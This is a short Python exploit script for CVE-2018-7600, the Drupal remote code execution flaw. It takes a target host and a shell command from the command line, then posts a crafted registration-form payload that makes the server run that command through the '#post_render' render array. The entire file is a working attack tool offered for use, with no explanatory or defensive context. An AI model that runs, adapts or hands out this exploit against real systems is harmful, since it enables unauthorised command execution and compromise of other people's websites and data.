import sys
import requests 
import getopt

URL = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'


def usage():
    print("CVE-2018-7600 Remote Code Execution in drupal")
    print()
    print("Flags:")
    print("{} - Target host".format("\t-t --target ".ljust(20," ")))
    print("{} - Command".format("\t-c --command".ljust(20, " ")))
    print()


def main():
    if len(sys.argv) > 1:
        try:
            opts,args = getopt.getopt(sys.argv[1:],"t:c:",["target","command"])
        except: 
            print(str(e))
            usage()
            sys.exit(1)
        target = None
        command = None
        for o,a in opts:
            if o in ("-t","--target"):
                target = a
            elif o in ("-c","--command"):
                command = a
            else:
                print("[!] Invalid option {}".format(o))

    else:
        print("[!] Must provide target and command")
        sys.exit(1)

    quit = False

    if target is None:
        print("[!] Must provide target with -t or --target")
        quit = True

    if command is None:
        print("[!] Must provide command with -c or --command")
        quit = True

    if quit:
        sys.exit(1)

    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(command)}

    print("[+] Sending payload")
    req = requests.post("http://{}{}".format(target, URL), data=payload)


if __name__ == '__main__':
    main()